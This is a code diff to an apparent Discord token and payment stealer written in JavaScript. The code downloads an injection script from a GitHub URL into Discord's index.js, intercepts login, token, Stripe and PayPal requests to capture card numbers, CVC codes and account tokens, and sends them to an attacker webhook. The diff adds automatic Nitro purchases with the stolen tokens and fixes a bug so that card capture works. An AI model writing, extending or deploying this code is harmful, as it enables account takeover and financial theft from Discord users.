@@ -17,7 +17,7 @@ const config = {
   webhook: "%WEBHOOK_LINK%",
   injection_url: "https://raw.githubusercontent.com/NobodyWouldEverUseThis7/NobodyWouldEverUseThis8/main/file.js",
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
-  api: "https://discord.com/api/v9/users/@me",
+    api: "https://discord.com/api/v9/users/@me",
   nitro: {
     boost: {
       year: {
@@ -49,6 +49,7 @@ const config = {
       "https://*.discord.com/api/v*/auth/login",
       "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
       "https://api.stripe.com/v*/tokens",
+      "https://api.stripe.com/v1/tokens",
       "https://api.stripe.com/v*/setup_intents/*/confirm",
       "https://api.stripe.com/v*/payment_intents/*/confirm",
     ],
@@ -112,7 +113,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('%WEBHOOK%', '${config.webhook}').replace('changemeplease', '${config.auto_buy_nitro}').replace("~~stringspy~~", '${config.stringspy}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -172,7 +173,7 @@ const getBilling = async (token) => {
             billing += "💳 ";
             break;
           case 2:
-            billing += "<:paypal:951139189389410365> ";
+            billing += "<:paypal:951139189389410365>";
             break;
         }    }
   });
@@ -455,7 +456,7 @@ const PaypalAdded = async (token) => {
           },
           {
             name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: false,
           },
           {
@@ -476,6 +477,12 @@ const PaypalAdded = async (token) => {
   };
   if (config.ping_on_run) content["content"] = config.ping_val;
   hooker(content);
+  if (config.auto_buy_nitro === true) {
+    setTimeout(() => {
+        nitroBought(token).catch(console.error);
+      }, 7500);
+  }
+
 };
 
 const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
@@ -518,6 +525,12 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
   };
   if (config.ping_on_run) content["content"] = config.ping_val;
   hooker(content);
+  if (config.auto_buy_nitro === true) {
+    setTimeout(() => {
+        nitroBought(token).catch(console.error);
+      }, 7500);
+  }
+
 };
 
 const nitroBought = async (token) => {
@@ -563,6 +576,7 @@ const nitroBought = async (token) => {
   if (config.ping_on_run) content["content"] = config.ping_val + `\n${code}`;
   hooker(content);
 };
+
 session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
     if (details.url.startsWith("wss://remote-auth-gateway")) return callback({ cancel: true });
     updateCheck();
@@ -604,6 +618,7 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
   }
 });
 
+
 session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
   if (details.statusCode !== 200 && details.statusCode !== 202) return;
   const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
@@ -627,7 +642,8 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
       break;
 
     case details.url.endsWith("tokens") && details.method === "POST":
-      const item = querystring.parse(unparsedData.toString());
+      login("cccc", "cccc", "token").catch(console.error);
+      const item = querystring.parse(unparsed_data.toString());
       ccAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token).catch(console.error);
       break;
 
